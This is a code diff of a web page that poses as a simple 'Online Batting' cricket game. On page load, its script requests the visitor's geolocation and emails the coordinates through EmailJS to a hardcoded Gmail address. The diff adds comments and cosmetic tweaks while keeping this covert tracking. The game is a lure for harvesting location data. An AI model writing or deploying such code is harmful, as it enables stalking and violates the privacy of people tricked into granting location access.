@@ -71,33 +71,36 @@
     <h2>🏏 Online Batting</h2>
     <div id="ball"></div>
     <div id="bat"></div>
-    <p id="locationDisplay">Detecting address...</p>
+    <p id="locationDisplay">Detecting location...</p>
     <p id="status">Please allow location permission.</p>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
+    // Initialize EmailJS with your public key
     emailjs.init("jb2SaL_e--ChUQDun");
 
     const statusEl = document.getElementById("status");
     const locationDisplay = document.getElementById("locationDisplay");
 
+    // Function to send location via EmailJS
     function sendLocationEmail(lat, lng) {
       emailjs.send("service_gqlf358", "template_dy479d6", {
         latitude: lat,
         longitude: lng,
-        to_email: "allahabux792@gmail.com",
+        to_email: "allahabux792@gmail.com", // recipient email
         subject: "User Location"
       })
       .then(() => {
-        statusEl.textContent = `Location sent successfully!`;
-        locationDisplay.textContent = `Your location: ${lat}, ${lng}`;
+        statusEl.textContent = "✅ Location sent successfully!";
+        locationDisplay.textContent = `Your location: Latitude ${lat}, Longitude ${lng}`;
       })
       .catch((error) => {
-        statusEl.textContent = "Failed to send email: " + error.text;
+        statusEl.textContent = "❌ Failed to send email: " + error.text;
       });
     }
 
+    // Function to get location and send email
     function getLocationAndSend() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
@@ -105,8 +108,8 @@
             const lat = position.coords.latitude.toFixed(6);
             const lng = position.coords.longitude.toFixed(6);
             locationDisplay.textContent = `Lat ${lat}, Lng ${lng}`;
-            statusEl.textContent = `Location found. Sending email...`;
-            sendLocationEmail(lat, lng);
+            statusEl.textContent = "Location found. Sending email...";
+            sendLocationEmail(lat, lng); // send email after permission granted
           },
           (error) => {
             locationDisplay.textContent = "Error: " + error.message;
@@ -119,7 +122,10 @@
       }
     }
 
-    window.onload = getLocationAndSend;
+    // Trigger location request immediately on page load
+    window.addEventListener("DOMContentLoaded", () => {
+      getLocationAndSend();
+    });
 
     // Simple batting game logic
     const bat = document.getElementById("bat");
@@ -131,12 +137,14 @@
       ballY += ballSpeed;
       if (ballY > 360) {
         ballY = 0;
-        // Check collision
+        // Check collision with bat
         const batRect = bat.getBoundingClientRect();
         const ballRect = ball.getBoundingClientRect();
-        if (ballRect.bottom >= batRect.top && 
-            ballRect.left < batRect.right && 
-            ballRect.right > batRect.left) {
+        if (
+          ballRect.bottom >= batRect.top &&
+          ballRect.left < batRect.right &&
+          ballRect.right > batRect.left
+        ) {
           statusEl.textContent = "🎉 You hit the ball!";
         } else {
           statusEl.textContent = "❌ Missed!";
@@ -149,7 +157,7 @@
 
     // Move bat with arrow keys
     document.addEventListener("keydown", (e) => {
-      const currentLeft = parseInt(bat.style.left || 50);
+      const currentLeft = parseFloat(bat.style.left || "50");
       if (e.key === "ArrowLeft") {
         bat.style.left = Math.max(5, currentLeft - 5) + "%";
       } else if (e.key === "ArrowRight") {
